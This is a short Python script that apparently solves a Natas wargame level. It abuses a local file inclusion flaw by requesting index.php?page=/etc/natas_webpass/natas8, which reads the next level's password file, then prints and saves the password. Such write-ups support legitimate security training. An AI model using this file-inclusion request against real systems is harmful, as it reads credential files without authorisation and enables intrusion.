#!/usr/bin/env python
from driver import *


req=makeGetConnection()
print req


# <snip>
# <a href="index.php?page=home">Home</a>
# <a href="index.php?page=about">About</a>
# <br>
# <br>

# <!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->
# </div>
# </snip>


# This is an lfi
# We just need to query index.php?page=/etc/natas_webpass/natas8



req = makeGetConnection(target="index.php?page=/etc/natas_webpass/natas8")

#This pulls it. Now let us retrieve it

passwd = retrievePassword(req.text)

print passwd

# nextLlv = int(lvl) + 1
# with open( ("natas" + str(nextLlv) +".pass") , "w")as f:
# 	f.write(passw + "\n")
# print "The password for natas" + str(nextLlv) + " is: " + passw
print_and_store_password(passwd)

